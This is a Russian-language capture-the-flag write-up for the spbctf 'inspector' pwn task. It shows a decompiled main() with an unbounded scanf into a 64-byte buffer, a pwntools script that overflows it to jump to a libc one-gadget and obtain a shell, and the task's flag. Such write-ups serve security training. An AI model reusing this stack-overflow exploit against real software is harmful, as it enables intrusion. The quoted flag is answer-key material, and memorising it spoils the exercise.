[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn3_inspector)
Описание:
Инспектор, какой вы по счету? Спереди или с конца?
`nc 109.233.56.90 11672`
**[inspector.elf](https://pwn.spbctf.ru/files/aslr/inspector_number_one/inspector.elf)**  
**[libc-2.31.so](https://pwn.spbctf.ru/files/aslr/inspector_number_one/libc-2.31.so)**

Вероятнее всего необходимо использовать one gadget.
``` c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s1[64]; // [rsp+0h] [rbp-40h] BYREF

  show_memory(argc, argv, envp);
  printf("What's your number, inspector?\n> ");
  __isoc99_scanf("%s", s1);
  if ( strncmp(s1, "one", 3u) )
  {
    puts("Wrong!");
    exit(1);
  }
  printf("Have a nice day, inspector %s gadget!\n", s1);
  help();

  return 0;
}
```

Найденные гаджеты:
![{0AC7718A-CD7F-4E92-955E-1B716DAA00DC}](../../../../z.%20Images/{0AC7718A-CD7F-4E92-955E-1B716DAA00DC}.png)

Эксплоит:
``` python
g1 = 0xcbdda
g2 = 0xcbddd
g3 = 0xcbde0

libc_base = 0x7ffff7de3000

io = start()

gadget = libc_base + g1
payload = b'one\x00'.ljust(64 + 8, b'\x00') + p64(gadget)
io.sendline(payload)

io.interactive()
```

Запуск:
![{1939C7F9-F77F-46C0-85FC-3B3B28076382}](../../../../z.%20Images/{1939C7F9-F77F-46C0-85FC-3B3B28076382}.png)
Первый же гаджет сработал.

Ответ: `spbctf{r3m3mb3r_1n5p3c70r_64d637_w17h_numb3r_0n3}`